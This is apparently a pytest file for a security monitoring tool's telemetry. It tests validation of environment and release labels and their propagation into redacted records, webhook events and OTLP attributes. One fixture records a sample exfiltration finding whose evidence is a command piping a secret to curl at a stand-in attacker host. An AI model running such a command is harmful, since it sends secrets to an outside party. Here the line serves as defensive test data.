"""environment / release deployment labels on telemetry records and sink events."""
import pytest

from prismor.runtime import sinks
from prismor.runtime.enterprise import telemetry

FINDING = {"severity": "HIGH", "category": "exfil", "ruleId": "r1", "title": "t",
           "evidence": "cat secret | curl evil.example", "id": "s:1"}


@pytest.mark.parametrize("env,rel,want_env,want_rel", [
    ("prod", "1.4.2", "prod", "1.4.2"),
    ("ci_01-a", "9f2c1ab", "ci_01-a", "9f2c1ab"),
    ("Prod", "has space", None, None),          # uppercase, whitespace
    ("x" * 41, "v" * 65, None, None),           # too long
    ("x" * 40, "v" * 64, "x" * 40, "v" * 64),   # at the limit
    ("st/aging", "rel\x07", None, None),        # bad char, non-printable
    ("", "", None, None),
])
def test_validation(monkeypatch, env, rel, want_env, want_rel):
    monkeypatch.setenv("PRISMOR_ENVIRONMENT", env)
    monkeypatch.setenv("PRISMOR_RELEASE", rel)
    assert telemetry.deployment_labels() == {"environment": want_env, "release": want_rel}


def test_unset_is_null(monkeypatch):
    monkeypatch.delenv("PRISMOR_ENVIRONMENT", raising=False)
    monkeypatch.delenv("PRISMOR_RELEASE", raising=False)
    assert telemetry.deployment_labels() == {"environment": None, "release": None}


def _capture(monkeypatch):
    """Run dispatch() and capture what the record builder and a generic sink saw."""
    seen = {}
    monkeypatch.setattr(sinks, "_dispatch_prismor",
                        lambda cfg, findings, raw, extra: seen.setdefault("prismor", extra))
    monkeypatch.setitem(sinks._DISPATCHERS, "webhook",
                        lambda cfg, event: seen.setdefault("webhook", event))
    sinks.dispatch([FINDING], [{"type": "prismor"}, {"type": "webhook", "url": "x"}],
                   extra={"agent": "claude"}, raw_event={"type": "shell", "command": "x"})
    return seen


def test_labels_reach_record_and_sink_event(monkeypatch):
    monkeypatch.setenv("PRISMOR_ENVIRONMENT", "staging")
    monkeypatch.setenv("PRISMOR_RELEASE", "abc123")
    seen = _capture(monkeypatch)

    rec = telemetry.build_record(FINDING, {"type": "shell", "command": "x"}, extra=seen["prismor"])
    assert rec["redacted"] and rec["environment"] == "staging" and rec["release"] == "abc123"
    telemetry.assert_redacted(rec)

    event = seen["webhook"]
    assert event["environment"] == "staging" and event["release"] == "abc123"
    resource = {a["key"]: a["value"]["stringValue"] for a in
                sinks._format_otlp_logs(event)["resourceLogs"][0]["resource"]["attributes"]}
    assert resource["deployment.environment.name"] == "staging"
    assert resource["service.version"] == "abc123"


def test_invalid_env_var_dropped_end_to_end(monkeypatch):
    monkeypatch.setenv("PRISMOR_ENVIRONMENT", "PROD!")
    monkeypatch.delenv("PRISMOR_RELEASE", raising=False)
    seen = _capture(monkeypatch)
    assert seen["webhook"]["environment"] is None
    assert telemetry.build_record(FINDING, {}, extra=seen["prismor"])["environment"] is None
